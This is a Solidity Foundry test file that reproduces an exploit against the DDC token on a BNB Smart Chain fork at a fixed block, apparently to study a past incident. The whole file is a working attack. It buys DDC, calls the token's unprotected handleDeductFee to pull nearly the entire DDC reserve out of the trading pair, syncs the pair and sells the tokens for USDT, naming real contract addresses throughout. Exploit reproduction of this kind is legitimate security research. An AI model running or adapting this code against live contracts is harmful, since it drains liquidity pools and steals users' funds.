pragma solidity ^0.8.10;

import "forge-std/Test.sol";
//import "./../interface.sol";

interface CheatCodes {
    function createSelectFork(string calldata, uint256) external returns (uint256);
}

interface IERC20 {
    function balanceOf(address owner) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
}

interface ITokenAFeeHandler is IERC20 {
    function handleDeductFee(uint8 actionType, uint256 feeAmount, address from, address user) external;
}

interface IRouter {
    function swapExactTokensForTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
    function swapExactTokensForTokensSupportingFeeOnTransferTokens(
        uint256 amountIn,
        uint256 amountOutMin,
        address[] calldata path,
        address to,
        uint256 deadline
    ) external;
}

interface IPair {
    function sync() external;
}

contract ContractTest is Test {
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IRouter TargetRouter = IRouter(0x22Dc25866BB53c52BAfA6cB80570FC83FC7dd125);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    ITokenAFeeHandler DDC = ITokenAFeeHandler(0x443195AA3a4357242a7427Fc8ce5f20c1E71fcB1);
    IPair TargetPair = IPair(0x4EFdcabA42cC31cF5198ec99BDC025aff1e32Bb0);
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);

    function setUp() public {
        cheats.createSelectFork("bsc", 20_840_079);
    }

    function testExploit() external {
        emit log_named_decimal_uint("[Start] Attacker USDT balance before exploit", USDT.balanceOf(address(this)), 18);

        address(WBNB).call{value: 0.1 ether}("");
        BuyDDC();
        uint256 pairReserve = DDC.balanceOf(address(TargetPair));
        uint256 amount = pairReserve - 1;
        DDC.handleDeductFee(0, amount, address(TargetPair), address(this));
        TargetPair.sync();
        SellDDC();

        emit log_named_decimal_uint("[End] Attacker USDT balance after exploit", USDT.balanceOf(address(this)), 18);
    }

    function BuyDDC() public {
        WBNB.approve(address(TargetRouter), ~uint256(0));
        address[] memory path = new address[](3);
        path[0] = address(WBNB);
        path[1] = address(USDT);
        path[2] = address(DDC);
        TargetRouter.swapExactTokensForTokens(WBNB.balanceOf(address(this)), 0, path, address(this), block.timestamp);
        DDC.approve(address(TargetRouter), ~uint256(0));
    }

    function SellDDC() public {
        address[] memory path = new address[](2);
        path[0] = address(DDC);
        path[1] = address(USDT);
        TargetRouter.swapExactTokensForTokens(DDC.balanceOf(address(this)), 0, path, address(this), block.timestamp);
    }
}
